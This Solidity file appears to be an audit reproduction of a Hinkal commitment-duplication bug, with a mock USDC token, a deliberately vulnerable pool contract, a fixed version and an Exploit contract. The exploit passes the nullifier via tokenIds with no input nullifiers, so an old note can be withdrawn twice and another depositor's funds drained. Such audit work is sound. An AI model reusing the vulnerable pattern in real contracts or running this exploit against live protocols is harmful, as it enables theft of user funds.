// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 60148 — Hinkal commitment duplication (Quantstamp).
 * formBasicInput appends tokenIds and then inputNullifiers. A transfer proof whose
 * public input is a single nullifier still verifies if that nullifier is placed in
 * tokenIds and inputNullifiers is empty — the concatenated input is identical.
 * insertNullifiers then writes nothing, so the old 1,000,001 USDC commitment stays
 * spendable next to the new 1,000,000 commitment. Alice withdraws both and takes
 * the other depositor's 1,000,000 USDC.
 */

contract USDC {
    string public name = "USD Coin";
    string public symbol = "USDC";
    uint8 public constant decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract Hinkal {
    struct Commitment {
        address owner;
        uint256 amount;
        bool spent;
    }

    USDC public token;
    bytes32 public validInputHash;
    mapping(uint256 => bool) public nullified;
    mapping(uint256 => Commitment) public commitments;
    uint256 public nullifierPasses;

    constructor(USDC _token) {
        token = _token;
    }

    function registerProof(uint256[] memory honestInput) external {
        validInputHash = keccak256(abi.encode(honestInput));
    }

    function deposit(uint256 nullifier, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        commitments[nullifier] = Commitment(msg.sender, amount, false);
    }

    function formBasicInput(uint256[] memory tokenIds, uint256[] memory inputNullifiers)
        public
        pure
        returns (uint256[] memory input)
    {
        input = new uint256[](tokenIds.length + inputNullifiers.length);
        uint256 k;
        for (uint256 i; i < tokenIds.length; i++) input[k++] = tokenIds[i];
        for (uint256 i; i < inputNullifiers.length; i++) input[k++] = inputNullifiers[i];
    }

    function verifyProof(uint256[] memory input) public view returns (bool) {
        return keccak256(abi.encode(input)) == validInputHash;
    }

    function insertNullifiers(uint256[] memory inputNullifiers) internal {
        nullifierPasses += 1;
        for (uint256 i; i < inputNullifiers.length; i++) {
            require(!nullified[inputNullifiers[i]], "used");
            nullified[inputNullifiers[i]] = true;
        }
    }

    function transact(
        uint256[] memory tokenIds,
        uint256[] memory inputNullifiers,
        uint256[] memory newNullifiers,
        uint256[] memory newAmounts,
        address[] memory newOwners
    ) external {
        uint256[] memory input = formBasicInput(tokenIds, inputNullifiers);
        require(verifyProof(input), "proof");
        // empty inputNullifiers inserts nothing, so the old note stays spendable
        insertNullifiers(inputNullifiers);
        for (uint256 i; i < newNullifiers.length; i++) {
            commitments[newNullifiers[i]] = Commitment(newOwners[i], newAmounts[i], false); // @> VULN:
        }
    }

    function withdraw(uint256 nullifier, address to) external {
        Commitment storage c = commitments[nullifier];
        require(c.owner == msg.sender, "owner");
        require(!c.spent, "spent");
        require(!nullified[nullifier], "null");
        c.spent = true;
        nullified[nullifier] = true;
        token.transfer(to, c.amount);
    }
}

contract HinkalFixed {
    struct Commitment {
        address owner;
        uint256 amount;
        bool spent;
    }

    USDC public token;
    bytes32 public validInputHash;
    mapping(uint256 => bool) public nullified;
    mapping(uint256 => Commitment) public commitments;

    constructor(USDC _token) {
        token = _token;
    }

    function registerProof(uint256[] memory honestInput) external {
        validInputHash = keccak256(abi.encode(honestInput));
    }

    function deposit(uint256 nullifier, uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        commitments[nullifier] = Commitment(msg.sender, amount, false);
    }

    function transact(
        uint256[] memory tokenIds,
        uint256[] memory inputNullifiers,
        uint256[] memory newNullifiers,
        uint256[] memory newAmounts,
        address[] memory newOwners
    ) external {
        uint256 n = tokenIds.length + inputNullifiers.length;
        uint256[] memory input = new uint256[](n);
        uint256 k;
        for (uint256 i; i < tokenIds.length; i++) input[k++] = tokenIds[i];
        for (uint256 i; i < inputNullifiers.length; i++) input[k++] = inputNullifiers[i];
        require(keccak256(abi.encode(input)) == validInputHash, "proof");
        require(inputNullifiers.length == input.length, "nullifiers");
        for (uint256 i; i < input.length; i++) {
            require(!nullified[input[i]], "used");
            nullified[input[i]] = true;
        }
        for (uint256 i; i < newNullifiers.length; i++) {
            commitments[newNullifiers[i]] = Commitment(newOwners[i], newAmounts[i], false);
        }
    }

    function withdraw(uint256 nullifier, address to) external {
        Commitment storage c = commitments[nullifier];
        require(c.owner == msg.sender, "owner");
        require(!c.spent, "spent");
        require(!nullified[nullifier], "null");
        c.spent = true;
        nullified[nullifier] = true;
        token.transfer(to, c.amount);
    }
}

contract VictimDepositor {
    function deposit(USDC token, Hinkal h, uint256 nullifier, uint256 amount) external {
        token.approve(address(h), amount);
        h.deposit(nullifier, amount);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant BOB = 0x4444444444444444444444444444444444444444;
    uint256 internal constant ALICE_IN = 1_000_001e6;
    uint256 internal constant VICTIM_IN = 1_000_000e6;
    uint256 internal constant OLD_NULL = 7;
    uint256 internal constant NEW_ALICE = 8;
    uint256 internal constant NEW_BOB = 9;
    uint256 internal constant VICTIM_NULL = 11;

    USDC public token;
    Hinkal public hinkal;
    VictimDepositor public victim;
    uint256 public withdrawn;

    function run() external {
        token = new USDC();
        hinkal = new Hinkal(token);
        victim = new VictimDepositor();

        uint256[] memory honest = new uint256[](1);
        honest[0] = OLD_NULL;
        hinkal.registerProof(honest);

        token.mint(address(victim), VICTIM_IN);
        victim.deposit(token, hinkal, VICTIM_NULL, VICTIM_IN);

        token.mint(address(this), ALICE_IN);
        token.approve(address(hinkal), ALICE_IN);
        hinkal.deposit(OLD_NULL, ALICE_IN);

        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = OLD_NULL;
        uint256[] memory emptyNulls = new uint256[](0);
        uint256[] memory newNulls = new uint256[](2);
        newNulls[0] = NEW_ALICE;
        newNulls[1] = NEW_BOB;
        uint256[] memory newAmounts = new uint256[](2);
        newAmounts[0] = 1_000_000e6;
        newAmounts[1] = 1e6;
        address[] memory newOwners = new address[](2);
        newOwners[0] = address(this);
        newOwners[1] = BOB;

        hinkal.transact(tokenIds, emptyNulls, newNulls, newAmounts, newOwners);
        require(!hinkal.nullified(OLD_NULL), "nullified");

        hinkal.withdraw(OLD_NULL, ATTACKER);
        hinkal.withdraw(NEW_ALICE, ATTACKER);
        withdrawn = token.balanceOf(ATTACKER);
        require(withdrawn == ALICE_IN + VICTIM_IN, "drained");
        require(token.balanceOf(address(hinkal)) == 0, "pool");
    }
}
